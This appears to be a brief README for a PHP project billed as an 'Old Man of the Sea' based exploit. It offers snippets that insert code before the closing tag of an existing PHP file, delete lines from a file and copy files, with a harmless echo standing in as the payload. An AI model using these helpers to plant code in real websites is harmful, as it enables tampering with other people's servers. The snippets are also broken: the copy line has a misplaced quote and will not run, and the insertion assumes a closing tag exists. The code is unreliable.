# oms
 An "Old Man of the Sea" based exploit on PHP

#helpful usages

<code>
//adding<br>
$data="echo 'hello world!'";<br>
$filecontent=file_get_contents('file.php');<br>
$pos=strpos($filecontent, '?>');<br>
$filecontent=substr($filecontent, 0, $pos)."\r\n".$data."\r\n".substr($filecontent, $pos);<br>
echo file_put_contents("file.php", $filecontent);<br>
<br><br>
//removing lines<br>
$row_number = 22;<br>
$file_out = file("file.php");<br>
unset($file_out[$row_number]);<br>
file_put_contents("file.php", implode("", $file_out));<br>
<br><br>
//copying<br>
echo copy("file.php,"target.php");
</code>
